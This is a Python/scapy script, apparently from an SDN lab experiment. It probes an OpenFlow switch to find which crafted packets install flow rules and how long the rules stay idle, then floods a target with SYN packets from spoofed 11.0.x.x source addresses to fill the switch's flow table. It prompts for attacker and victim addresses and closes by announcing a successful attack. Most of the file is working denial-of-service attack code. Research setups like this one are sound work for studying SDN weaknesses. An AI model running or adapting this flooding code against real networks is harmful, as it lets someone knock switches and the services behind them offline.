#!/usr/bin/env python
# coding=utf-8
# encoding: utf-8
import os
import sys
import keyboard
from scapy.all import *
#from scapy.layers.inet import TCP,IP,ICMP,Ether,UDP
from scapy.layers.inet import *
import time
import scapy
# #pkt = IP(dst="10.0.0.7")/ICMP()
# pkt1 = IP(dst="10.0.0.18")/TCP(dport=80)
# #send(pkt, return_packets=True)
# send(pkt1, return_packets=True)
# print(pkt1.time)

#pkt = Ether(dst = "00:00:00:00:00:02",src = "00:00:00:00:00:01")/IP(dst="10.0.0.2",src="10.0.0.1")
# for i in range(10):
#     #pkt = Ether(dst="00:00:00:00:00:02", src="00:00:00:00:00:01")/IP(dst="10.0.0.2",src="10.0.0.1")/ICMP()
#     pkt = IP(dst="10.0.0.4")/ICMP()
#     # pkt.show()
#     send(pkt, return_packets=True)
# packet = IP(dst="10.0.0.3")/UDP(dport=56789)
# result = sr1(packet,timeout=0.5,verbose=0)
# for i in range(10):
#     #sr1(IP(dst="10.0.0.4", tos=147)/TCP(dport=80,flags="S"))
#     send(IP(dst="10.0.0.4", tos=147) / TCP(dport=2500,sport=2600))

ipLayer0 = IP(dst='10.0.0.2')
ipLayer1 = IP(src='10.0.0.1', dst='10.0.0.2')
ipLayer2 = IP(src='10.0.0.1')
tcpLayer0 = TCP(dport=81, flags="S")
tcpLayer1 = TCP(sport=86, dport=81, flags="S")
tcpLayer2 = TCP(sport=86, flags="S")
udpLayer0 = UDP(dport=81)
udpLayer1 = UDP(sport=86, dport=81)
udpLayer2 = UDP(dport=81)
icmpLayer = ICMP()
packet1 = ipLayer0/tcpLayer0
packet2 = ipLayer0/tcpLayer1
packet3 = ipLayer0/tcpLayer2
packet4 = ipLayer1/tcpLayer0
packet5 = ipLayer1/tcpLayer1
packet6 = ipLayer1/tcpLayer2
packet7 = ipLayer2/tcpLayer0
packet8 = ipLayer2/tcpLayer1
packet9 = ipLayer2/tcpLayer2
packet10 = ipLayer0/udpLayer0
packet11 = ipLayer0/udpLayer1
packet12 = ipLayer0/udpLayer2
packet13 = ipLayer1/udpLayer0
packet14 = ipLayer1/udpLayer1
packet15 = ipLayer1/udpLayer2
packet16 = ipLayer2/udpLayer0
packet17 = ipLayer2/udpLayer1
packet18 = ipLayer2/udpLayer2
packet19 = ipLayer0/icmpLayer
packet20 = ipLayer1/icmpLayer
packet21 = ipLayer2/icmpLayer
packetList = [packet1,packet2,packet3,packet4,packet5,packet6,packet7,packet8,packet9,packet10,packet11,packet12,packet13,packet14,packet15,packet16,packet17,packet18,packet19,packet20,packet21]

def check():
    flow = os.system("ovs-ofctl dump-tables s1001 -O openflow13 > test.txt")
    with open("test.txt") as f:
        content = f.read().replace('\n', ' ')
    print(content)
    if content.find("active=4") != -1:
        return False
    else:
        return True
    f.close()

def clear():
    os.system("ovs-ofctl del-flows s1001 'in_port=3,nw_src=10.0.0.2,nw_dst=10.0.0.1' -O openflow13 >/dev/null 2>&1")
    os.system("ovs-ofctl del-flows s1001 'in_port=2,nw_src=10.0.0.1,nw_dst=10.0.0.2' -O openflow13 >/dev/null 2>&1")

def sendpacket():
    reslut = []
    for i in packetList:
        for j in range(5):
            send(i, verbose=0)
        reslut1 = check()
        if reslut1:
            reslut.append(i)
            clear()
    # reslut = [packet1,packet2,packet4,packet5,packet10,packet11,packet13,packet14,packet19,packet20]
    f = open("k1.txt", "w")
    f.write('Packet commonality according to switch rules:'+ str(len(reslut)) + '\n')
    f.close()
    print('Packet commonality according to switch rules:'+ str(len(reslut)) + '\n')
    wrpcap('temp.cap', reslut)
    pkts = rdpcap('temp.cap')
    pkts.show()
    # f = open("k", "w")
    # for line in reslut:
    #     f.write(line)
    # f.close()


def synFlood_pro(xunhuanceshu, diyici):  # tgt

    # srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    # for sPort in range(1024,1034):
    counter = 0
    zhongshu = 0
    timelist = []
    t1 = MyThread(job2, args=(timelist,))
    t1.start()
    for i in range(0, 254):
        for j in range(1, 254):
            counter += 1
            zhongshu += 1
            print(zhongshu)
            # attacker_index = index1
            # attacker = net.get(topo.HostList[attacker_index])
            # attacker.popen("python test2.py", shell=True)
            ip_adress = '11.0.{0}.{1}'.format(i, j)
            ipLayer = IP(src=ip_adress, dst='10.0.0.2')
            tcpLayer = TCP(sport=86, dport=81, flags="S")
            icmpLayer = ICMP()
            packet = ipLayer / tcpLayer
            # attacker_index = index1
            # attacker = net.get(topo.HostList[attacker_index])
            # os.system("hping3 -c 4 -d 120 -S -w 64 -a "+ip_adress+" -p 80 10.0.0.3 --faster")
            # os.system("ovs-ofctl add-flow s3001 idle_timeout=600,hard_timeout=3600,priority=1000,icmp,in_port=5,nw_src=10.0.0.3,nw_dst="+ip_adress+",actions=output:3 -O openflow13")
            # os.system("ovs-ofctl add-flow s3001 idle_timeout=600,hard_timeout=3600,priority=1000,icmp,in_port=3,nw_src="+ ip_adress +",nw_dst=10.0.0.3,actions=output:5 -O openflow13")
            send(packet, verbose=0)
            send(packet, verbose=0)
            send(packet, verbose=0)
            # time.sleep(2)
            # if counter == 48:
            #     return
            if counter == xunhuanceshu and diyici == 1:
                counter = 0
                #os.system("ping 10.0.0.2 -c10")
                # attacker_index = 1
                # attacker = net.get(topo.HostList[attacker_index])
                # attacker.popen("python test5.py", shell=True)
                for i in range(11):
                    # pkt = Ether(dst="00:00:00:00:00:02", src="00:00:00:00:00:01")/IP(dst="10.0.0.2",src="10.0.0.1")/ICMP()
                    pkt = IP(dst="10.0.0.4") / ICMP()
                    send(pkt, verbose=0)
                jieguo1 = t1.get_result()
                print(jieguo1)
                if jieguo1[7] < 0.01 and jieguo1[6] < 0.01 and jieguo1[5] < 0.01:
                    job1()
                    t1 = MyThread(job2, args=(timelist,))
                    t1.start()
                else:
                    print(zhongshu)
                    jieguolist = [zhongshu*2, 0]
                    return jieguolist
            elif counter == xunhuanceshu and diyici == 0:
                print(zhongshu)
                jieguolist = [zhongshu, 0]
                return jieguolist

def job1():
    os.system("ovs-ofctl --strict del-flows s1001 'priority=1000,icmp,in_port=5,nw_src=10.0.0.4,nw_dst=10.0.0.1' -O openflow13")
    os.system("ovs-ofctl --strict del-flows s1001 'priority=1000,icmp,in_port=2,nw_src=10.0.0.1,nw_dst=10.0.0.4' -O openflow13")

def job2(timeList):
    os.system("tcpdump -c 20 -nn -i any --time-stamp-precision=nano '((icmp) and ((src 10.0.0.1) or (dst 10.0.0.1)))' -w test2.pcap")
    packets = rdpcap('test2.pcap')
    # for i in packets:
    #     if IP in i:
    #         print(i.time)
    #         print(i[IP].src)
    pao1 = []
    pao2 = []
    pao3 = []
    pao4 = []
    timelist = []
    for pack in packets:
        if pack[CookedLinux].pkttype == 3 and pack[ICMP].type == 8:
            pao1.append(pack)
        elif pack[CookedLinux].pkttype == 4 and pack[ICMP].type == 8:
            pao2.append(pack)
        elif pack[CookedLinux].pkttype == 3 and pack[ICMP].type == 0:
            pao3.append(pack)
        elif pack[CookedLinux].pkttype == 0 and pack[ICMP].type == 0:
            pao4.append(pack)

    # timelist1 = []
    for x, y in zip(pao2, pao4):
        timelist.append(y.time - x.time)
    return timelist

def livetime():
    #os.system("tcpdump -c 41 -nn -i any icmp --time-stamp-precision=nano and src 10.0.0.1 or dst 10.0.0.1 -w test2.pcap")
    for i in range(10):
        #pkt = Ether(dst="00:00:00:00:00:02", src="00:00:00:00:00:01")/IP(dst="10.0.0.2",src="10.0.0.1")/ICMP()
        pkt = IP(src="11.0.0.1", dst="10.0.0.3")/TCP(sport=80, dport=81, flags="S")
        #pkt = IP(dst="10.0.0.2") / UDP(dport=80)
        send(pkt, verbose=0)
    print("success sniff!")

def job():
    flow = os.system("ovs-ofctl dump-tables s1002 -O openflow13 > test.txt")
    with open("test.txt") as f:
        content = f.read().replace('\n', ' ')
    str1 = "active=4"
    if content.find("active=4") != -1:
        print("found python!")
    else:
        print("anzchengg")
    os.system("ovs-ofctl del-flows s1001 'in_port=5,nw_src=10.0.0.4,nw_dst=10.0.0.2' -O openflow13")
    os.system("ovs-ofctl del-flows s1001 'in_port=3,nw_src=10.0.0.2,nw_dst=10.0.0.4' -O openflow13")
    f.close()

class MyThread(threading.Thread):
    def __init__(self, func, args=()):
        super(MyThread, self).__init__()
        self.func = func
        self.args = args

    def run(self):
        self.result = self.func(*self.args)

    def get_result(self):
        threading.Thread.join(self)
        try:
            return self.result
        except Exception:
            return None

def generate_flow():
    time.sleep(1)
    for i in range(10):
        # pkt = Ether(dst="00:00:00:00:00:02", src="00:00:00:00:00:01")/IP(dst="10.0.0.2",src="10.0.0.1")/ICMP()
        pkt = IP(dst="10.0.0.2") / ICMP()
        send(pkt, verbose=0)
    print('sending end')
    pass

def detction():
    print("Start idel_time probe!!!!")
    Period_Time = 2.0
    time.sleep(Period_Time)
    out = True
    cycles_nums = 1
    qianyige_period = 1
    dangqian = 1
    zengjiashijian = 2.0
    the_first_time = True
    Pre_Period_Time = 0.0
    zhishu = 1
    chaoshizhi = 0.0
    while out:
        timelist = []
        # t1 = threading.Thread(target=job, args=(timelist,), name='job1')
        # t2 = threading.Thread(target=generate_flow, args=(net, topo, 0), name='job2')
        # t1.start()
        # t2.start()
        t1 = MyThread(job2, args=(timelist,))
        t1.start()
        t2 = MyThread(generate_flow, args=())
        t2.start()
        resluttime = t1.get_result()
        print(resluttime)
        # if float(resluttime[0]) < 0.01 or float(resluttime[1]) < 0.01 or float(resluttime[2]) < 0.01 or cycles_nums == 1:
        if (float(resluttime[0]) < 0.01 or cycles_nums == 1) and zhishu == 1:
            # Period_Time = Period_Time + 1
            # print(Period_Time)
            # time.sleep(Period_Time)
            # cycles_nums = cycles_nums + 1
            zengjiashijian = Period_Time
            Pre_Period_Time = Period_Time
            Period_Time = Period_Time + zengjiashijian
            print(Period_Time)
            time.sleep(Period_Time)
            cycles_nums = cycles_nums + 1
        elif float(resluttime[0]) > 0.01 and cycles_nums != 1:
            zhishu = 0
            chaoshizhi = Period_Time
            if the_first_time == True:
                the_first_time = False
                zengjiashijian = zengjiashijian / 2
                Period_Time = Pre_Period_Time + zengjiashijian
                print(Period_Time)
                print("******************************")
                print(zengjiashijian)
                time.sleep(Period_Time)
                cycles_nums = cycles_nums + 1
            else:
                zengjiashijian = zengjiashijian / 2
                Period_Time = Pre_Period_Time + zengjiashijian
                print(Period_Time)
                print("******************************")
                print(zengjiashijian)
                time.sleep(Period_Time)
                cycles_nums = cycles_nums + 1

            if zengjiashijian == 0.125:
                out = False
                print("the idel_time:", Period_Time)
                print("the end time !!!")
        else:
            Pre_Period_Time = Period_Time
            Period_Time = Period_Time + zengjiashijian
            if Period_Time == chaoshizhi:
                zengjiashijian = zengjiashijian/2
                Period_Time = Pre_Period_Time + zengjiashijian

            print(Period_Time)
            print("******************************")
            print(zengjiashijian)
            time.sleep(Period_Time)
            cycles_nums = cycles_nums + 1
    print("period has found!!!")

if __name__=='__main__':
    #sendpacket('10.0.0.2')
    #synFlood('10.0.0.3',81)
    a,b,c,d = input("Please enter the attacker IP, victim IP, attacker port and victim port separated by spaces:").split(' ')
    sendpacket()
    print("Press enter to continue and any other button to exit:")
    while True:
        try:
            if keyboard.is_pressed('ENTER'):
                detction()
                print("Press enter to continue and any other button to exit:")
                while True:
                    try:
                        if keyboard.is_pressed('ENTER'):
                            jieguo = [10, 1]
                            num = 1
                            while num < 30:
                                num += 1
                                jieguo = synFlood_pro(jieguo[0], jieguo[1])
                                time.sleep(30)
                            break
                        if keyboard.is_pressed('Esc'):
                            print("exiting...")
                            sys.exit(0)
                    except:
                        break
                break
            if keyboard.is_pressed('Esc'):
                print("exiting...")
                sys.exit(0)
        except:
            break
    # jieguo = [10, 1]
    # num = 1
    # while num< 10:
    #     num +=1
    #     jieguo = synFlood_pro(jieguo[0], jieguo[1])
    #     time.sleep(10)
    # t2 = threading.Thread(target=livetime,name='job2')
    # t2.start()
    print("sucess attack!!!!!")